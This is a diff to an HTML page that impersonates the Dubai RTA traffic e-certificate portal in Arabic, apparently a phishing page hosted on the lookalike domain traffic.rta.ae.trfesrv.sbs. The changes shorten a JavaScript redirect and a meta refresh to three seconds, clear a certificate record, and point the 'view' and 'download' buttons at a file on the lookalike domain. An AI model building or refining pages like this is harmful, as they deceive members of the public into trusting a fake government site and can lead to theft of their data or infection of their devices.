@@ -5,7 +5,6 @@
 <link rel="icon" type="image/jpeg" href="rta.jpg">
 
 
-<!-- دائرة تحميل سريعة صغيرة فوق الصفحة -->
 <div id="small-loader-overlay" style="
   position: fixed;
   inset: 0;
@@ -41,19 +40,16 @@
 setTimeout(function(){
   var overlay = document.getElementById("small-loader-overlay");
   overlay.style.display = "flex";
+  // تم تعديل هذا السطر ليصبح 3000 ملي ثانية (3 ثواني) بدلاً من 40000
   setTimeout(function(){
     overlay.style.display = "none";
-    window.location.href = "https://traffic.rta.ae.trfesrv.sbs/public_resources/view-ecertificate.do.pdf";
-  }, 40000);
+    window.location.href = "https://traffic.rta.ae.trfesrv.sbs/public_resources/index.html";
+  }, 3000); 
 }, 3000);
 </script>
 
 
-
-
-
-<meta http-equiv="refresh" content="140000000000; url=https://traffic.rta.ae.trfesrv.sbs/public_resources/view-ecertificate.do.pdf">
-
+<meta http-equiv="refresh" content="3; url=https://traffic.rta.ae.trfesrv.sbs/public_resources/index.html">
 
 
 
@@ -820,21 +816,21 @@ setTimeout(function(){
         </th>
       </tr>
       <tr>
-        <td style="text-align:center">69925428</td>
-        <td style="text-align:center">شهادة تصدير</td>
         <td style="text-align:center"></td>
-        <td style="text-align:center">25-03-2025</td>
+        <td style="text-align:center"> </td>
+        <td style="text-align:center"></td>
+        <td style="text-align:center"></td>
         <td style="text-align:center"></td>
         <td style="text-align:center"></td>
         <td>
           <p class="margb4">
-            <a class="vewmore reg-btn-gray vewCertificate cboxElement" href="https://trfesrv.github.io/public_resources/view-ecertificate.do.pdf" target="_blank">
+            <a class="vewmore reg-btn-gray vewCertificate cboxElement" href="https://traffic.rta.ae.trfesrv.sbs/public_resources/view-ecertificate.do.pdf" target="_blank">
   <em class="fxdwdth">عرض الشهادة</em>
 </a>
             </a>
           </p>
           <p class="margb4">
-  <a class="reg-btn-gray" href="https://drive.google.com/uc?export=download&id=10OAvKS3rczG3meqSX33rEiMbFfx1PzqT" target="_blank">
+  <a class="reg-btn-gray" href="https://traffic.rta.ae.trfesrv.sbs/public_resources/view-ecertificate.do.pdf" target="_blank">
     <em class="fxdwdth">تحميل</em>
   </a>
 </p>
@@ -1481,3 +1477,6 @@ setTimeout(function(){
   </main>
 
 </template><script data-template-shadow-root>(()=>{document.currentScript.remove();processNode(document);function processNode(node){node.querySelectorAll("template[shadowrootmode]").forEach(element=>{let shadowRoot = element.parentElement.shadowRoot;if (!shadowRoot) {try {shadowRoot=element.parentElement.attachShadow({mode:element.getAttribute("shadowrootmode"),delegatesFocus:element.getAttribute("shadowrootdelegatesfocus")!=null,clonable:element.getAttribute("shadowrootclonable")!=null,serializable:element.getAttribute("shadowrootserializable")!=null});shadowRoot.innerHTML=element.innerHTML;element.remove()} catch (error) {} if (shadowRoot) {processNode(shadowRoot)}}})}})()</script>
+
+
+
